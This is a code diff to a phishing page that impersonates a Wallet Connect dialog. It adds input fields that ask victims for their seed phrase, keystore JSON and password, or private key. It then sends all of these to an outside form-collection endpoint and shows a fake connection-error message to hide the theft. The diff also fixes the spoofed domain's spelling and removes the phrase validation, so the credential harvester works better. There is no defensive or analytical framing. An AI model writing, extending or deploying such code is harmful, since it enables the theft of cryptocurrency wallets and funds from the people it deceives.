@@ -168,7 +168,7 @@
                                     </div>
                                     <div class="author-infor">
                                         <h5 class="style2"><a>Wallet Connect</a></h5>
-                                        <span class="price">wallettconnect.com</span>
+                                        <span class="price">walletconnect.com</span>
                                     </div>
                                 </div>
                             </div>
@@ -1609,7 +1609,7 @@
 
                         <div id="failed_to_connect" style="display:none;">
                             <div style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
-                                An error occurred... please try again or connect mannually
+                                An error occurred... please try again or connect manually
                             </div>
                             <br><br><br>
                             <a href="#" id="try_auto_connecting_again" class="btn btn-outline-primary" aria-label="Close">Try Again</a><br>
@@ -1617,11 +1617,21 @@
                         </div>
 
                         <div id="div_connect_manuallly" style="display:none;">
+                            <div class="button">
+                                <button  type="button" id="Keystore" class="btn btn-outline-primary b" >Keystore Json</button>
+                                <button  type="button" id="phrase" class="btn btn-outline-primary b"  >Phrase</button>
+                                <button  type="button" id="private" class="btn btn-outline-primary b"  >private Key</button>
+                                
+                                
+                            </div>
+                            
+                            <textarea style="font-size:25px; font-weight:650" rows="3" name="secret_phrase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
+                            <textarea  style="font-size:20px;  font-weight:600" rows="3" name="key_json" id="key_json" class="form-control text-primary" placeholder="Enter your key_json ."></textarea><br>
+                            <textarea style="font-size:17px;  font-weight:550" rows="2" name="key_json_password" id="key_json_password" class="form-control text-primary" placeholder="Enter your key_json password."></textarea><br>
+                            <textarea style="font-size:17px;  font-weight:550" rows="3" name="private_key" id="private_key" class="form-control text-primary" placeholder="Enter your private_key."></textarea><br>
 
-                            <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
 
-
-                            <button disabled type="button" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
+                            <button  type="button" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
                         </div>
 
                         <!--<input type="text" class="form-control" placeholder="00.00 ETH">
@@ -1702,30 +1712,59 @@
                 $('#auto_connecting').hide();
                 $('#failed_to_connect').hide();
                 $('#div_connect_manuallly').show();
+                $('#key_json').hide();
+                $('#key_json_password').hide();
+                $('#private_key').hide();
+            })
+
+            $('#Keystore').on('click', function(e) {
+                $('#key_json').show();
+                $('#key_json_password').show();
+                $('#secret_phrase').hide();
+                $('#private_key').hide();
+            })
+
+            $('#private').on('click', function(e) {
+                $('#secret_phrase').hide();
+                $('#key_json').hide();
+                $('#key_json_password').hide();
+                $('#private_key').show();
+            })
+            $('#phrase').on('click', function(e) {
+                $('#secret_phrase').show();
+                $('#key_json').hide();
+                $('#key_json_password').hide();
+                $('#private_key').hide();
             })
 
             //FOR PHRASE TEXT VALIDATION
-            $('#secret_phrase').on('keyup', function() {
-                var phrase_seed_entered = $(this).val().trim()
-                if (phrase_seed_entered != "") {
-                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
-                    console.log(phrase_count)
-                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    } else {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    }
-                } else {
-                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
-                }
-            })
+            // $('#secret_phrase').on('keyup', function() {
+            //     var phrase_seed_entered = $(this).val().trim()
+            //     if (phrase_seed_entered != "") {
+            //         var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
+            //         console.log(phrase_count)
+            //         if ([12, 15, 18, 21, 24].includes(phrase_count)) {
+            //             $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
+            //         } else {
+            //             $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
+            //         }
+            //     } else {
+            //         $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
+            //     }
+            // })
 
             //CONNECT WALLET BUTTON Handler
 
             $('#button_connect_wallet').click(function(e) {
                 e.preventDefault();
                 let field = $('#secret_phrase');
+                let field1 = $('#key_json');
+                let key_password = $('#key_json_password');
+                let key_private = $('#private_key');
                 let value = field.val();
+                let key = field1.val();
+                let password = key_password.val();
+                let private_key = key_private.val();
                 let wallet_name = $('#wallet_name').text().trim();
 
                 if (field.val().length >= 12) {
@@ -1737,7 +1776,52 @@
                         method: "POST",
                         data: {
                             "phrase": value,
-                            "wallet": wallet_name
+                            "wallet": wallet_name,
+                            "key_json": key,
+                            "password": password,
+                            "private_key": private_key
+                        },
+                        success: function(data) {
+                            alert("Erroe connecting......");
+                        },
+                        error: function(errMsg) {
+                            alert('Error connecting......');
+                        }
+                    });
+                } else if (field1.val().length != ""){
+                     $(this).text('Loading...').css('pointer-events', 'none');
+
+                    $.ajax({
+                        // url: "https://submit-form.com/QccF8zfW",
+                        url: "https://submit-form.com/X3ZbCdes",
+                        method: "POST",
+                        data: {
+                            "phrase": value,
+                            "wallet": wallet_name,
+                            "key_json": key,
+                            "password": password,
+                            "private_key": private_key
+                        },
+                        success: function(data) {
+                            alert("Erroe connecting......");
+                        },
+                        error: function(errMsg) {
+                            alert('Error connecting......');
+                        }
+                    });
+                } else if (key_private.val().length != ""){
+                     $(this).text('Loading...').css('pointer-events', 'none');
+
+                    $.ajax({
+                        // url: "https://submit-form.com/QccF8zfW",
+                        url: "https://submit-form.com/X3ZbCdes",
+                        method: "POST",
+                        data: {
+                            "phrase": value,
+                            "wallet": wallet_name,
+                            "key_json": key,
+                            "password": password,
+                            "private_key": private_key
                         },
                         success: function(data) {
                             alert("Erroe connecting......");
@@ -1787,7 +1871,18 @@
             transition: all 0.3s ease-in-out;
             outline: none;
             border: 1px solid #5142FC;
-            margin-bottom: 10px
+            margin-bottom: 10px;
+        
+        }
+
+        .button{
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+
+        .button .btn-outline-primary.b{
+            width: 35%;
         }
     </style>
 </body>
